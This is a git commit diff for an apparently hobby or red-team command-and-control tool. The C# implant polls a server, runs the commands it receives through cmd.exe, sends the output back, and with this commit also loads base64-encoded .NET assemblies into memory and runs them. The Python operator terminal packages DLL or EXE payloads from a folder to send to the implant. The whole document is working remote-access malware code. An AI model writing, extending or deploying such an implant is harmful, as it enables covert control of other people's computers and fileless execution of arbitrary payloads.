e00c841af6770086516ba5488f9bb469250c68f9
reyals <matthew_findley@hotmail.com>
2023-09-24 11:12:41 -0400

    Added ability to define commands and load assembly

--- C2/Program.cs
+++ C2/Program.cs
@@ -1,10 +1,54 @@
 ﻿using System.Diagnostics;
+using System.Reflection;
+
 string responseBody;
 int sleep = 2000;
 string server = "http://127.0.0.1:5000";
 
+void assemblyload(string payload) {
+    try {
+        byte[] bytearray = Convert.FromBase64String(payload);
+        Assembly asm = Assembly.Load(bytearray);
+        var method = asm.EntryPoint;
+        method.Invoke(null, new object[] {new string[] { } });
+    } catch (Exception e) {
+        sendmessagetoserver(e.ToString());
+    }
+    return;
+}
+
+
+//built in command handler function
+bool handlecommands(string command) {
+    string[] splits = command.Split(" ");
+    if (splits[0] == "sleep") {
+        sleep = Convert.ToInt16(splits[1]) * 1000;
+        return true;
+    }
+    if (splits[0] == "changeserver") {
+        server = splits[1]; //don't mess up though or you'll never get a callback
+        return true;
+    }
+    if (splits[0] == "load") {
+        assemblyload(splits[1]);
+        return true;
+    }
+
+    return false;
+}
+
 HttpClient client = new HttpClient();
+
+async Task<bool> sendmessagetoserver(string message) {
+    StringContent postdata = new StringContent(message);
+    var response = await client.PostAsync(server + "/response", postdata);
+    responseBody = await response.Content.ReadAsStringAsync();
+    Console.WriteLine(responseBody); //print the response for sanity checking
+    return true;
+}
+
 while (true) {
+try {
     Thread.Sleep(sleep);
     HttpResponseMessage response = await client.GetAsync(server + "/checkin");
     if (response.StatusCode != System.Net.HttpStatusCode.OK) {
@@ -13,7 +57,9 @@ while (true) {
     //response.EnsureSuccessStatusCode();
     responseBody = await response.Content.ReadAsStringAsync();
     Console.WriteLine(responseBody); //print the request for sanity checking
-
+    if (handlecommands(responseBody)) {
+        continue;
+    }
     //spawn a new cmd process
     Process start = new Process();
     start.StartInfo.FileName = "c:\\windows\\system32\\cmd.exe";
@@ -26,8 +72,8 @@ while (true) {
     //read the output
     string data = start.StandardOutput.ReadToEnd();
     //convert the output to a string and send it back to the server
-    StringContent postdata = new StringContent(data);
-    response = await client.PostAsync(server + "/response", postdata);
-    responseBody = await response.Content.ReadAsStringAsync();
-    Console.WriteLine(responseBody); //print the response for sanity checking
+    await sendmessagetoserver(data);
+} catch (Exception e) {
+    await sendmessagetoserver(e.ToString());
+}
 }
--- server/terminal.py
+++ server/terminal.py
@@ -1,8 +1,22 @@
+import base64
+import os
+
 class Terminal():
+    #WORK TO DO LATER move over to pathlib for better support
+    payloadspath = os.path.dirname(os.path.realpath(__file__)) + "/../payloads/"
     def listen(self, commands):
         while True:
             try:
                 cmd = input()
+                splits = cmd.split(" ")
+                if splits[0] == "load":
+                    data = b""
+                    try:
+                        data = open(self.payloadspath + splits[1] + ".dll","rb").read()
+                    except:
+                        data = open(self.payloadspath + splits[1] + ".exe","rb").read()
+                    b64 = base64.b64encode(data)
+                    cmd = b"load " + b64
                 commands.put(cmd)
                 if cmd == "exit":
                     break
